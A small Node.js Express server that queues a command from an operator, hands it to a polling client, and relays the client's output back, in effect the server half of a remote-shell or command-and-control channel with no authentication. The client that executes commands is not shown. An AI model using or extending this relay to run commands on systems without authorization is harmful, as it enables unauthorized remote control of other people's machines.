// give command
// host command
// receive output


const express = require('express')
const app = express()
const port = 3000
const fs = require("fs")

app.use(express.static('public'));

app.get('/', (req, res) => {
  res.send(fs.readFileSync('public/terminal.html').toString("utf-8"))
})

var command = ""
var reply = ""


//send command
app.get('/send_command', (req, res) => {
  command = req.query.cmd
  console.log("Command '"+command+ "' was received")
  res.send('OK')
})

// reply if message in queue
app.get('/send_reply', (req, res) => {
  reply = req.query.reply
  console.log("Reply '"+reply+ "' was given")
  res.send('OK')

})

// reply if message in queue
app.get('/get_reply', (req, res) => {
  if(reply.length > 0) {
    var ret = reply+""
    reply = ""
    res.send(ret)
    return;
  }
  res.send('OK')
})

//take command from queue
app.get('/get_command', (req, res) => {
  //console.log
  if(command.length > 0) {
    console.log("Command '"+command+ "' was given")
    var ret = command+""
    command = ""
    res.send(ret)
    return;
  }
  res.send('OK')
})


app.listen(port, () => {
  console.log(`Africa server listening at http://localhost:${port}`)
})
